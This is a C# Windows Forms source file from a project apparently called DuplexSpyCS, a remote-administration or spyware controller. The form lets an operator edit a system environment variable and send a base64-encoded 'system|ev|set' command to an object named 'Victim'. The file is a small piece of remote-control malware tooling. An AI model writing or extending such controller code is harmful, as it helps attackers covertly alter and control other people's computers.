using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmSysEV : Form
    {
        public Victim v;

        public string g_szEvName;
        public EnvironmentVariableTarget g_target;
        public List<string> g_lsVals;

        public frmSysEV()
        {
            InitializeComponent();
        }

        void setup()
        {
            if (g_szEvName != null)
            {
                textBox1.Text = g_szEvName;
            }

            if (g_lsVals != null)
            {
                foreach (string szVal in g_lsVals)
                {
                    textBox2.AppendText(szVal);
                    textBox2.AppendText(Environment.NewLine);
                }
            }
        }

        private void frmSysEV_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            v.SendCommand($"system|ev|set|{g_szEvName}|{g_target}|{Crypto.b64E2Str(string.Join(";", textBox2.Lines.Where(x => !string.IsNullOrEmpty(x)).ToArray()))}");
        }
    }
}
